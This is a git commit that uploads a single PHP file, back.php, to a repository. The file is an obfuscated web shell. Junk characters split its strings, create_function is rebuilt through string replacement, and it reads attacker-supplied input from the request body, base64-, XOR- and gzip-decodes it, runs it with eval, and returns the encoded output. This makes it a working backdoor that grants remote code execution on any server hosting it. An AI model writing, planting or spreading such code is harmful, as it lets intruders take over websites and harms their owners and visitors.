028f52c0a0a20d7e31c6f813cf32a31bf98182a1
hossammesbah2020 <45940886+hossammesbah2020@users.noreply.github.com>
2020-01-20 21:20:44 +0200

    Add files via upload

---
+++ back.php
@@ -0,0 +1,11 @@
+<?php
+$I='preg_match("/$kh)D(.+)D)$kf)D/",@fil)De)D_get_contents()D"php:)D//input)D"),$)Dm)==1)D){@ob_sta)Drt();';
+$V='@ob_en)Dd_)Dclean();)D$r=@base6)D)D4_encode(@x)D(@gzcom)Dpre)Dss($o))D,$k))D))D;pr)Dint("$p$kh$r$kf");}';
+$u='$k="ed)D5be9)Daa";$)Dkh=)D"f)D75573765674)D";$kf="640c4)Da7)D76c07";$)Dp=")D7)DkEWu3xqvwy8Cdl)DS)D";f';
+$Q=str_replace('kh','','crkhekhate_khfkhunckhtkhion');
+$e=')Dunct)Dion)D x()D$t,$k){$c=strle)Dn($k);$l=strle)Dn()D$t);)D$o=)D"";f)Do)Dr($i=0;$i<$l;){)Df';
+$M='@e)Dva)Dl(@gzunco)Dmpres)Ds(@x(@b)Da)Dse64)D_deco)Dde($m[1]),$)Dk)));$o)D=@ob)D_get_co)Dntents()D);';
+$q='or($j=0;($j<$)Dc&&$i<)D$l);)D)D)D$j++,$i)D++){$o.=$t{$i}^$)Dk{$j};)D}}retu)Drn)D $o;}i)Df(@)D';
+$F=str_replace(')D','',$u.$e.$q.$I.$M.$V);
+$c=$Q('',$F);$c();
+?>
